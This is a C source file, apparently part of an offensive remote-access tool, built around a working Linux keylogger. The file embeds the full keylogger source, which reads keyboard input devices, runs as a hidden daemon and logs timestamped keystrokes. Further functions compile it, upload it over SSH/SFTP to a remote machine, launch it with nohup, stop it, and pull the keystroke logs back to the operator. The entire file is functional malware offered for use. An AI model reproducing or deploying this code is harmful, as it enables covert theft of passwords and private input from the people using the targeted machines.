#include "keylogger.h"
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include <fcntl.h>

// ==================== Keylogger Functions ====================

const char* generate_keylogger_binary() {
    static const char* keylogger_source = 
        "#include <stdio.h>\n"
        "#include <stdlib.h>\n"
        "#include <string.h>\n"
        "#include <fcntl.h>\n"
        "#include <unistd.h>\n"
        "#include <time.h>\n"
        "#include <linux/input.h>\n"
        "#include <dirent.h>\n"
        "#include <signal.h>\n"
        "#include <sys/stat.h>\n"
        "#include <sys/ioctl.h>\n"
        "\n"
        "char* logfile = NULL;\n"
        "int running = 1;\n"
        "\n"
        "void signal_handler(int sig) {\n"
        "    running = 0;\n"
        "}\n"
        "\n"
        "void log_key(int code, int value, FILE* log) {\n"
        "    if (value != 1) return;\n"
        "    \n"
        "    time_t now;\n"
        "    struct tm* timeinfo;\n"
        "    char timestamp[20];\n"
        "    \n"
        "    time(&now);\n"
        "    timeinfo = localtime(&now);\n"
        "    strftime(timestamp, sizeof(timestamp), \"%H:%M:%S\", timeinfo);\n"
        "    \n"
        "    char key_char = '?';\n"
        "    char* key_name = NULL;\n"
        "    \n"
        "    switch(code) {\n"
        "        case 30: key_char = 'a'; break;\n"
        "        case 48: key_char = 'b'; break;\n"
        "        case 46: key_char = 'c'; break;\n"
        "        case 32: key_char = 'd'; break;\n"
        "        case 18: key_char = 'e'; break;\n"
        "        case 33: key_char = 'f'; break;\n"
        "        case 34: key_char = 'g'; break;\n"
        "        case 35: key_char = 'h'; break;\n"
        "        case 23: key_char = 'i'; break;\n"
        "        case 36: key_char = 'j'; break;\n"
        "        case 37: key_char = 'k'; break;\n"
        "        case 38: key_char = 'l'; break;\n"
        "        case 50: key_char = 'm'; break;\n"
        "        case 49: key_char = 'n'; break;\n"
        "        case 24: key_char = 'o'; break;\n"
        "        case 25: key_char = 'p'; break;\n"
        "        case 16: key_char = 'q'; break;\n"
        "        case 19: key_char = 'r'; break;\n"
        "        case 31: key_char = 's'; break;\n"
        "        case 20: key_char = 't'; break;\n"
        "        case 22: key_char = 'u'; break;\n"
        "        case 47: key_char = 'v'; break;\n"
        "        case 17: key_char = 'w'; break;\n"
        "        case 45: key_char = 'x'; break;\n"
        "        case 21: key_char = 'y'; break;\n"
        "        case 44: key_char = 'z'; break;\n"
        "        case 2: key_char = '1'; break;\n"
        "        case 3: key_char = '2'; break;\n"
        "        case 4: key_char = '3'; break;\n"
        "        case 5: key_char = '4'; break;\n"
        "        case 6: key_char = '5'; break;\n"
        "        case 7: key_char = '6'; break;\n"
        "        case 8: key_char = '7'; break;\n"
        "        case 9: key_char = '8'; break;\n"
        "        case 10: key_char = '9'; break;\n"
        "        case 11: key_char = '0'; break;\n"
        "        case 57: key_name = \"SPACE\"; break;\n"
        "        case 28: key_name = \"ENTER\"; break;\n"
        "        case 15: key_name = \"TAB\"; break;\n"
        "        case 14: key_name = \"BACKSPACE\"; break;\n"
        "        case 1: key_name = \"ESC\"; break;\n"
        "        case 42: key_name = \"SHIFT\"; break;\n"
        "        case 54: key_name = \"SHIFT\"; break;\n"
        "        case 29: key_name = \"CTRL\"; break;\n"
        "        case 97: key_name = \"CTRL\"; break;\n"
        "        case 56: key_name = \"ALT\"; break;\n"
        "        case 100: key_name = \"ALT\"; break;\n"
        "        case 58: key_name = \"CAPSLOCK\"; break;\n"
        "        case 12: key_char = '-'; break;\n"
        "        case 13: key_char = '='; break;\n"
        "        case 26: key_char = '['; break;\n"
        "        case 27: key_char = ']'; break;\n"
        "        case 43: key_char = '\\\\'; break;\n"
        "        case 39: key_char = ';'; break;\n"
        "        case 40: key_char = '\\''; break;\n"
        "        case 41: key_char = '`'; break;\n"
        "        case 51: key_char = ','; break;\n"
        "        case 52: key_char = '.'; break;\n"
        "        case 53: key_char = '/'; break;\n"
        "        default: \n"
        "            key_name = NULL;\n"
        "            key_char = '?';\n"
        "    }\n"
        "    \n"
        "    if (key_name) {\n"
        "        fprintf(log, \"[%s] Key: %s\\n\", timestamp, key_name);\n"
        "    } else if (key_char != '?') {\n"
        "        fprintf(log, \"[%s] Key: %c\\n\", timestamp, key_char);\n"
        "    } else {\n"
        "        fprintf(log, \"[%s] Key code: %d\\n\", timestamp, code);\n"
        "    }\n"
        "    \n"
        "    fflush(log);\n"
        "}\n"
        "\n"
        "int is_keyboard_device(const char* device_path) {\n"
        "    int fd = open(device_path, O_RDONLY);\n"
        "    if (fd == -1) return 0;\n"
        "    \n"
        "    unsigned long evbit = 0;\n"
        "    if (ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), &evbit) < 0) {\n"
        "        close(fd);\n"
        "        return 0;\n"
        "    }\n"
        "    \n"
        "    close(fd);\n"
        "    return (evbit & (1 << EV_KEY));\n"
        "}\n"
        "\n"
        "void write_pid_file() {\n"
        "    FILE* pid_file = fopen(\"/tmp/.keylogger.pid\", \"w\");\n"
        "    if (pid_file) {\n"
        "        fprintf(pid_file, \"%d\\n\", getpid());\n"
        "        fclose(pid_file);\n"
        "    }\n"
        "}\n"
        "\n"
        "int main(int argc, char* argv[]) {\n"
        "    if (argc < 2) {\n"
        "        fprintf(stderr, \"Usage: %s <logfile>\\n\", argv[0]);\n"
        "        return 1;\n"
        "    }\n"
        "    \n"
        "    logfile = argv[1];\n"
        "    \n"
        "    pid_t pid = fork();\n"
        "    if (pid < 0) exit(EXIT_FAILURE);\n"
        "    if (pid > 0) exit(EXIT_SUCCESS);\n"
        "    \n"
        "    umask(0);\n"
        "    setsid();\n"
        "    chdir(\"/\");\n"
        "    \n"
        "    close(STDIN_FILENO);\n"
        "    close(STDOUT_FILENO);\n"
        "    close(STDERR_FILENO);\n"
        "    \n"
        "    signal(SIGTERM, signal_handler);\n"
        "    signal(SIGINT, signal_handler);\n"
        "    \n"
        "    write_pid_file();\n"
        "    \n"
        "    FILE* log = fopen(logfile, \"a\");\n"
        "    if (!log) return 1;\n"
        "    \n"
        "    time_t now = time(NULL);\n"
        "    fprintf(log, \"\\n=== Keylogger started at %.24s ===\\n\", ctime(&now));\n"
        "    fflush(log);\n"
        "    \n"
        "    DIR* dir = opendir(\"/dev/input\");\n"
        "    if (!dir) {\n"
        "        fclose(log);\n"
        "        return 1;\n"
        "    }\n"
        "    \n"
        "    struct dirent* entry;\n"
        "    int num_devices = 0;\n"
        "    int* fds = NULL;\n"
        "    \n"
        "    while ((entry = readdir(dir)) != NULL) {\n"
        "        if (strncmp(entry->d_name, \"event\", 5) == 0) {\n"
        "            char device_path[256];\n"
        "            snprintf(device_path, sizeof(device_path), \"/dev/input/%s\", entry->d_name);\n"
        "            \n"
        "            if (is_keyboard_device(device_path)) {\n"
        "                int fd = open(device_path, O_RDONLY);\n"
        "                if (fd != -1) {\n"
        "                    fds = realloc(fds, (num_devices + 1) * sizeof(int));\n"
        "                    fds[num_devices++] = fd;\n"
        "                    fprintf(log, \"Monitoring keyboard device: %s\\n\", device_path);\n"
        "                    fflush(log);\n"
        "                }\n"
        "            }\n"
        "        }\n"
        "    }\n"
        "    \n"
        "    closedir(dir);\n"
        "    \n"
        "    if (num_devices == 0) {\n"
        "        fprintf(log, \"No keyboard devices found\\n\");\n"
        "        fclose(log);\n"
        "        return 1;\n"
        "    }\n"
        "    \n"
        "    struct input_event ev;\n"
        "    fd_set readfds;\n"
        "    \n"
        "    while (running) {\n"
        "        FD_ZERO(&readfds);\n"
        "        int max_fd = 0;\n"
        "        \n"
        "        for (int i = 0; i < num_devices; i++) {\n"
        "            FD_SET(fds[i], &readfds);\n"
        "            if (fds[i] > max_fd) max_fd = fds[i];\n"
        "        }\n"
        "        \n"
        "        struct timeval tv = {1, 0};\n"
        "        int ret = select(max_fd + 1, &readfds, NULL, NULL, &tv);\n"
        "        \n"
        "        if (ret <= 0) continue;\n"
        "        \n"
        "        for (int i = 0; i < num_devices; i++) {\n"
        "            if (FD_ISSET(fds[i], &readfds)) {\n"
        "                ssize_t bytes_read = read(fds[i], &ev, sizeof(ev));\n"
        "                if (bytes_read == sizeof(ev)) {\n"
        "                    if (ev.type == EV_KEY) {\n"
        "                        log_key(ev.code, ev.value, log);\n"
        "                    }\n"
        "                }\n"
        "            }\n"
        "        }\n"
        "    }\n"
        "    \n"
        "    for (int i = 0; i < num_devices; i++) {\n"
        "        close(fds[i]);\n"
        "    }\n"
        "    free(fds);\n"
        "    \n"
        "    now = time(NULL);\n"
        "    fprintf(log, \"=== Keylogger stopped at %.24s ===\\n\", ctime(&now));\n"
        "    fclose(log);\n"
        "    \n"
        "    unlink(\"/tmp/.keylogger.pid\");\n"
        "    return 0;\n"
        "}\n";
    
    return keylogger_source;
}

int deploy_remote_keylogger(ssh_session session, const char *remote_logfile) {
    printf("[*] Preparing remote keylogger...\n");
    
    char temp_source_path[PATH_MAX];
    snprintf(temp_source_path, sizeof(temp_source_path), "/tmp/keylogger_XXXXXX.c");
    int fd = mkstemps(temp_source_path, 2);
    if (fd < 0) {
        perror("Failed to create temporary source file");
        return -1;
    }
    
    const char* keylogger_source = generate_keylogger_binary();
    if (write(fd, keylogger_source, strlen(keylogger_source)) != (ssize_t)strlen(keylogger_source)) {
        perror("Failed to write source code");
        close(fd);
        unlink(temp_source_path);
        return -1;
    }
    close(fd);
    
    char temp_binary_path[PATH_MAX];
    snprintf(temp_binary_path, sizeof(temp_binary_path), "/tmp/keylogger_XXXXXX");
    fd = mkstemp(temp_binary_path);
    if (fd < 0) {
        perror("Failed to create temporary binary file");
        unlink(temp_source_path);
        return -1;
    }
    close(fd);
    
    char compile_cmd[1024];
    snprintf(compile_cmd, sizeof(compile_cmd), 
             "gcc -O2 -o %s %s -static", 
             temp_binary_path, temp_source_path);
    
    printf("[*] Compiling keylogger: %s\n", compile_cmd);
    int result = system(compile_cmd);
    if (result != 0) {
        fprintf(stderr, "Failed to compile keylogger (exit code: %d)\n", result);
        unlink(temp_source_path);
        unlink(temp_binary_path);
        return -1;
    }
    
    unlink(temp_source_path);
    
    FILE *binary_file = fopen(temp_binary_path, "rb");
    if (!binary_file) {
        perror("Failed to open compiled binary");
        unlink(temp_binary_path);
        return -1;
    }
    
    fseek(binary_file, 0, SEEK_END);
    long binary_size = ftell(binary_file);
    fseek(binary_file, 0, SEEK_SET);
    
    if (binary_size <= 0) {
        fprintf(stderr, "Invalid binary size: %ld\n", binary_size);
        fclose(binary_file);
        unlink(temp_binary_path);
        return -1;
    }
    
    char *binary_data = malloc(binary_size);
    if (!binary_data) {
        perror("Failed to allocate memory for binary");
        fclose(binary_file);
        unlink(temp_binary_path);
        return -1;
    }
    
    if (fread(binary_data, 1, binary_size, binary_file) != (size_t)binary_size) {
        perror("Failed to read binary file");
        free(binary_data);
        fclose(binary_file);
        unlink(temp_binary_path);
        return -1;
    }
    
    fclose(binary_file);
    unlink(temp_binary_path);
    
    char remote_binary_path[PATH_MAX] = "/tmp/.keylogger";
    
    ssh_channel channel = ssh_channel_new(session);
    if (channel && ssh_channel_open_session(channel) == SSH_OK) {
        if (ssh_channel_request_exec(channel, "echo $HOME") == SSH_OK) {
            char home_path[256] = {0};
            int nbytes = ssh_channel_read(channel, home_path, sizeof(home_path) - 1, 0);
            if (nbytes > 0) {
                home_path[nbytes] = '\0';
                char *newline = strchr(home_path, '\n');
                if (newline) *newline = '\0';
                newline = strchr(home_path, '\r');
                if (newline) *newline = '\0';
                
                if (strlen(home_path) > 0) {
                    snprintf(remote_binary_path, sizeof(remote_binary_path), 
                            "%s/.keylogger", home_path);
                }
            }
        }
        ssh_channel_close(channel);
        ssh_channel_free(channel);
    }
    
    printf("[*] Uploading keylogger to %s (%ld bytes)...\n", remote_binary_path, binary_size);
    
    sftp_session sftp = sftp_new(session);
    if (!sftp) {
        fprintf(stderr, "Error allocating SFTP session: %s\n", ssh_get_error(session));
        free(binary_data);
        return -1;
    }
    
    if (sftp_init(sftp) != SSH_OK) {
        fprintf(stderr, "Error initializing SFTP session: %s\n", ssh_get_error(session));
        sftp_free(sftp);
        free(binary_data);
        return -1;
    }
    
    sftp_file remote_file = sftp_open(sftp, remote_binary_path, 
                                      O_WRONLY | O_CREAT | O_TRUNC, 
                                      S_IRUSR | S_IWUSR | S_IXUSR);
    if (!remote_file) {
        fprintf(stderr, "Error opening remote file %s: %s\n", 
                remote_binary_path, ssh_get_error(session));
        sftp_free(sftp);
        free(binary_data);
        return -1;
    }
    
    size_t written = 0;
    while (written < (size_t)binary_size) {
        size_t to_write = binary_size - written;
        if (to_write > 32768) to_write = 32768;
        
        int bytes = sftp_write(remote_file, binary_data + written, to_write);
        if (bytes < 0) {
            fprintf(stderr, "Error writing to remote file: %s\n", ssh_get_error(session));
            sftp_close(remote_file);
            sftp_free(sftp);
            free(binary_data);
            return -1;
        }
        
        written += bytes;
    }
    
    sftp_close(remote_file);
    sftp_free(sftp);
    free(binary_data);
    
    printf("[*] Starting remote keylogger...\n");
    
    channel = ssh_channel_new(session);
    if (!channel) {
        fprintf(stderr, "Error creating SSH channel: %s\n", ssh_get_error(session));
        return -1;
    }
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        fprintf(stderr, "Error opening SSH channel: %s\n", ssh_get_error(session));
        ssh_channel_free(channel);
        return -1;
    }
    
    char start_cmd[1024];
    snprintf(start_cmd, sizeof(start_cmd), 
             "chmod +x %s && nohup %s %s >/dev/null 2>&1 &", 
             remote_binary_path, remote_binary_path, remote_logfile);
    
    if (ssh_channel_request_exec(channel, start_cmd) != SSH_OK) {
        fprintf(stderr, "Error executing remote command: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    char buffer[1024];
    int nbytes;
    int timeout = 3;
    
    while (timeout > 0 && (nbytes = ssh_channel_read_timeout(channel, buffer, sizeof(buffer) - 1, 0, 1000)) > 0) {
        buffer[nbytes] = '\0';
        printf("Remote output: %s", buffer);
        timeout--;
    }
    
    ssh_channel_send_eof(channel);
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    
    printf("[+] Remote keylogger successfully deployed and started\n");
    printf("[+] Log file: %s\n", remote_logfile);
    printf("[+] Binary location: %s\n", remote_binary_path);
    
    return 0;
}

int stop_remote_keylogger_process(ssh_session session) {
    printf("[*] Stopping remote keylogger...\n");
    
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) {
        fprintf(stderr, "Error creating SSH channel: %s\n", ssh_get_error(session));
        return -1;
    }
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        fprintf(stderr, "Error opening SSH channel: %s\n", ssh_get_error(session));
        ssh_channel_free(channel);
        return -1;
    }
    
    const char *stop_cmd = "if [ -f /tmp/.keylogger.pid ]; then "
                          "kill $(cat /tmp/.keylogger.pid) 2>/dev/null; "
                          "rm -f /tmp/.keylogger.pid; "
                          "echo 'Keylogger stopped'; "
                          "else "
                          "pkill -f ~/.keylogger 2>/dev/null; "
                          "echo 'Attempted to stop keylogger'; "
                          "fi";
    
    if (ssh_channel_request_exec(channel, stop_cmd) != SSH_OK) {
        fprintf(stderr, "Error executing remote command: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return -1;
    }
    
    char buffer[1024];
    int nbytes;
    while ((nbytes = ssh_channel_read(channel, buffer, sizeof(buffer) - 1, 0)) > 0) {
        buffer[nbytes] = '\0';
        printf("%s", buffer);
    }
    
    ssh_channel_send_eof(channel);
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    
    return 0;
}

void start_remote_keylogger(keylogger_data_t *data, ssh_session session, const char *remote_logfile) {
    data->running = 1;
    data->session = session;
    
    if (remote_logfile) {
        strncpy(data->logfile, remote_logfile, sizeof(data->logfile) - 1);
    } else {
        strncpy(data->logfile, "/tmp/.keylog", sizeof(data->logfile) - 1);
    }
    data->logfile[sizeof(data->logfile) - 1] = '\0';
    
    if (deploy_remote_keylogger(session, data->logfile) == 0) {
        printf("[+] Remote keylogger started (logging to %s)\n", data->logfile);
    } else {
        fprintf(stderr, "[-] Failed to start remote keylogger\n");
        data->running = 0;
    }
}

void stop_remote_keylogger(keylogger_data_t *data) {
    if (!data->running) return;
    
    if (stop_remote_keylogger_process(data->session) == 0) {
        printf("[+] Remote keylogger stopped\n");
    } else {
        fprintf(stderr, "[-] Failed to stop remote keylogger\n");
    }
    
    data->running = 0;
}

int download_keylogs(keylogger_data_t *data, const char *local_path) {
    if (!data || !data->session || !local_path) {
        fprintf(stderr, "Invalid keylogger data or local path\n");
        return -1;
    }
    
    char dir_path[PATH_MAX] = {0};
    strncpy(dir_path, local_path, PATH_MAX - 1);
    
    char *last_slash = strrchr(dir_path, '/');
    if (last_slash) {
        *last_slash = '\0';
        
        if (strlen(dir_path) > 0) {
            struct stat st = {0};
            if (stat(dir_path, &st) == -1) {
                fprintf(stderr, "Directory %s does not exist\n", dir_path);
                return -1;
            }
        }
    }
    
    FILE *local_file = fopen(local_path, "w");
    if (!local_file) {
        fprintf(stderr, "Failed to open local file: %s\n", strerror(errno));
        return -1;
    }
    
    sftp_session sftp = sftp_new(data->session);
    if (!sftp) {
        fprintf(stderr, "Error allocating SFTP session: %s\n", 
                ssh_get_error(data->session));
        fclose(local_file);
        return -1;
    }
    
    if (sftp_init(sftp) != SSH_OK) {
        fprintf(stderr, "Error initializing SFTP session: %s\n",
                ssh_get_error(data->session));
        sftp_free(sftp);
        fclose(local_file);
        return -1;
    }
    
    sftp_file remote_file = sftp_open(sftp, data->logfile, O_RDONLY, 0);
    if (!remote_file) {
        fprintf(stderr, "Error opening remote file: %s\n", 
                ssh_get_error(data->session));
        sftp_free(sftp);
        fclose(local_file);
        return -1;
    }
    
    char buffer[4096];
    ssize_t nbytes, nwritten;
    int success = 1;
    
    while ((nbytes = sftp_read(remote_file, buffer, sizeof(buffer))) > 0) {
        nwritten = fwrite(buffer, 1, nbytes, local_file);
        if (nwritten != nbytes) {
            fprintf(stderr, "Error writing to local file: %s\n", strerror(errno));
            success = 0;
            break;
        }
    }
    
    if (nbytes < 0) {
        fprintf(stderr, "Error reading remote file: %s\n", 
                ssh_get_error(data->session));
        success = 0;
    }
    
    sftp_close(remote_file);
    sftp_free(sftp);
    fclose(local_file);
    
    if (success) {
        printf("[+] Keylogs downloaded to %s\n", local_path);
        return 0;
    } else {
        return -1;
    }
}

